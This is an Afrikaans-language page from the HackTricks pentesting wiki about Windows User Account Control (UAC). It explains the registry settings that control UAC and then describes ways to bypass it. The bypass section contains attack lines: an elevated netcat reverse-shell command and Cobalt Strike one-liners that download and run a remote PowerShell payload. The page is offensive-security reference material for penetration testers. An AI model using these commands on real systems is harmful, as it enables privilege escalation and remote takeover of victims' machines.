# UAC - Gebruikersrekeningebeheer

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Gebruikersrekeningebeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsvenster vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integriteit` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat die stelsel **potensieel kan benadeel**. Wanneer UAC geaktiveer is, hardloop toepassings en take altyd **onder die sekuriteitskonteks van 'n nie-administrateur-rekening** tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te hê om uit te voer. Dit is 'n geriefkenmerk wat administrateurs beskerm teen onbedoelde veranderinge, maar nie as 'n sekuriteitsgrens beskou word nie.

Vir meer inligting oor integriteitsvlakke:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaardgebruiker sleutel, om gewone aksies as 'n gewone vlak uit te voer, en een met die administrateurbevoegdhede.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC werk in groot diepte en sluit die aanmeldingsproses, gebruikerservaring, en UAC-argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie op die plaaslike vlak werk (deur secpol.msc te gebruik), of gekonfigureer en uitgerol via Groepbeleidsobjekte (GPO) in 'n Aktiewe Gids-domeinomgewing. Die verskeie instellings word in detail bespreek [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Daar is 10 Groepbeleidsinstellings wat vir UAC ingestel kan word. Die volgende tabel bied addisionele detail:

| Groepbeleidsinstelling                                                                                                                                                                                                                                                                                                                                                           | Regsleutel                  | Standaardinstelling                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### UAC Oorwegingsteorie

Sommige programme word **outomaties geëleweer** as die **gebruiker behoort** tot die **administrateur groep**. Hierdie bineêre lêers het binne hul _**Manifeste**_ die _**autoElevate**_ opsie met die waarde _**True**_. Die bineêre lêer moet ook **deur Microsoft onderteken** wees.

Daarom, om die **UAC te omseil** (verhoog vanaf **medium** integriteitsvlak **na hoog**) gebruik sommige aanvallers hierdie tipe bineêre lêers om **arbitrêre kode uit te voer** omdat dit vanaf 'n **Hoë vlak integriteitsproses** uitgevoer sal word.

Jy kan die _**Manifest**_ van 'n bineêre lêer **kontroleer** deur die instrument _**sigcheck.exe**_ van Sysinternals te gebruik. En jy kan die **integriteitsvlak** van die prosesse sien deur _Process Explorer_ of _Process Monitor_ (van Sysinternals) te gebruik.

### Kontroleer UAC

Om te bevestig of UAC geaktiveer is, doen:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Indien dit **`1`** is, is UAC **geaktiveer**, indien dit **`0`** is of dit **bestaan nie**, is UAC **onaktief**.

Dan, kontroleer **watter vlak** ingestel is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Indien **`0`** dan sal UAC nie vra nie (soos **uitgeschakel**)
* Indien **`1`** sal die admin vir gebruikersnaam en wagwoord gevra word om die binêre lêer met hoë regte uit te voer (op 'n veilige lessenaar)
* Indien **`2`** (**Meld my altyd aan**) sal UAC altyd vir bevestiging vra aan die administrateur wanneer hy iets met hoë regte probeer uitvoer (op 'n veilige lessenaar)
* Indien **`3`** soos `1` maar nie noodwendig op 'n veilige lessenaar nie
* Indien **`4`** soos `2` maar nie noodwendig op 'n veilige lessenaar nie
* as **`5`** (**verstek**) sal dit die administrateur vra om te bevestig om nie-Windows binêre lêers met hoë regte uit te voer

Dan moet jy na die waarde van **`LocalAccountTokenFilterPolicy`** kyk\
Indien die waarde **`0`** is, kan slegs die **RID 500**-gebruiker (**ingeboude Administrateur**) **admin take sonder UAC** uitvoer, en as dit `1` is, kan **alle rekeninge binne die "Administrateurs"**-groep dit doen.

En, neem uiteindelik 'n kyk na die waarde van die sleutel **`FilterAdministratorToken`**\
Indien **`0`**(verstek), kan die **ingeboude Administrateur-rekening** afgeleë administrasietake uitvoer en as **`1`** die ingeboude rekening Administrateur **kan nie** afgeleë administrasietake uitvoer nie, tensy `LocalAccountTokenFilterPolicy` op `1` ingestel is.

#### Opsomming

* Indien `EnableLUA=0` of **bestaan nie**, **geen UAC vir enigiemand nie**
* Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1` , Geen UAC vir enigiemand nie**
* Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=0`, Geen UAC vir RID 500 (Ingeboude Administrateur)**
* Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=1`, UAC vir almal**

Hierdie inligting kan almal ingesamel word met die **metasploit**-module: `post/windows/gather/win_privs`

Jy kan ook die groepe van jou gebruiker nagaan en die integriteitsvlak kry:
```
net user %username%
whoami /groups | findstr Level
```
## UAC omseil

{% hint style="info" %}
Let wel dat as jy grafiese toegang tot die slagoffer het, is UAC omseiling reguit vorentoe omdat jy eenvoudig op "Ja" kan klik wanneer die UAC-prompt verskyn.
{% endhint %}

Die UAC omseiling is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses hardloop in 'n medium integriteitskonteks, en jou gebruiker behoort tot die administrateursgroep**.

Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te omseil as dit in die hoogste sekuriteitsvlak (Altyd) is as wanneer dit in enige van die ander vlakke (Verstek) is**.

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **'n omgekeerde dop met administrateursbevoegdhede** (hoë integriteitsvlak) uitvoer deur iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC omseiling met token duplisering

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "omseiling" (volle lêersisteemtoegang)

As jy 'n skaal het met 'n gebruiker wat binne die Administrateursgroep is, kan jy die C$ deel via SMB (lêersisteem) plaaslik **aankoppel op 'n nuwe skyf en jy sal toegang hê tot alles binne die lêersisteem** (selfs die Administrateur se huisvouer).

{% hint style="warning" %}
**Dit lyk asof hierdie truuk nie meer werk nie**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC omseil met kobalt staking

Die Kobalt Staking tegnieke sal net werk as UAC nie op sy maksimum sekuriteitsvlak ingestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **verby**.

### KRBUACBypass

Dokumentasie en gereedskap in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-verbyfoute

[**UACME**](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC-verbyfoute is. Let daarop dat jy UACME sal moet **saamstel met behulp van Visual Studio of msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy benodig.**\
Wees **versigtig** omdat sommige verbyfoute ander programme kan **aanmoedig** wat die **gebruiker** sal **waarsku** dat iets gebeur.

UACME het die **bouweergawe waar elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes affekteer:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### Meer UAC-omseiling

**Al** die tegnieke wat hier gebruik word om UAC te omseil **vereis** 'n **volledige interaktiewe skaal** met die slagoffer (‘n gewone nc.exe skaal is nie genoeg nie).

Jy kan 'n **meterpreter**-sessie kry. Migreer na 'n **proses** wat die **Sessie**-waarde gelyk aan **1** het:

![](<../../.gitbook/assets/image (860).png>)

(_explorer.exe_ behoort te werk)

### UAC-omseiling met GUI

As jy toegang het tot 'n **GUI kan jy net die UAC-aanvraag aanvaar** wanneer jy dit kry, jy het nie regtig 'n omseiling nodig nie. Dus, toegang tot 'n GUI sal jou in staat stel om die UAC te omseil.

Verder, as jy 'n GUI-sessie kry wat iemand gebruik het (moontlik via RDP) is daar **sekere gereedskap wat as administrateur sal hardloop** waarvandaan jy 'n **cmd** byvoorbeeld **as admin** direk kan **hardloop** sonder om weer deur UAC gevra te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit mag dalk bietjie meer **steels** wees.

### Lawaaierige kragtige UAC-omseiling

As jy nie omgee om lawaaierig te wees nie, kan jy altyd iets soos [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) hardloop wat **vra om regte te verhoog totdat die gebruiker dit aanvaar**.

### Jou eie omseiling - Basiese UAC-omseiling metodologie

As jy na **UACME** kyk, sal jy opmerk dat **meeste UAC-omseilings 'n Dll Hijacking- kwesbaarheid misbruik** (hoofsaaklik deur die skadelike dll op _C:\Windows\System32_ te skryf). [Lees hierdie om te leer hoe om 'n Dll Hijacking-kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking/).

1. Vind 'n binêre lêer wat **outomaties verhoog** (kontroleer dat wanneer dit uitgevoer word, dit op 'n hoë integriteitsvlak loop).
2. Met procmon vind "**NAAM NIE GEVIND**" gebeure wat vatbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sommige **beskermde paaie** (soos C:\Windows\System32) moet **skryf** waar jy nie skryfregte het nie. Jy kan dit omseil deur:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit maak dit moontlik om die inhoud van 'n CAB-lêer binne beskermde paaie te onttrek (omdat hierdie gereedskap van 'n hoë integriteitsvlak uitgevoer word).
2. **IFileOperation**: Windows 10.
4. Berei 'n **skripsie** voor om jou DLL binne die beskermde pad te kopieer en die vatbare en outomaties verhoogde binêre uit te voer.

### 'n Ander UAC-omseilingstegniek

Bestaan daarin om te kyk of 'n **outomaties verhoogde binêre** probeer om van die **registreer** die **naam/pad** van 'n **binêre** of **opdrag** om **uitgevoer** te word te **lees** (dit is meer interessant as die binêre hierdie inligting binne die **HKCU** soek).

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsgereedskap.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
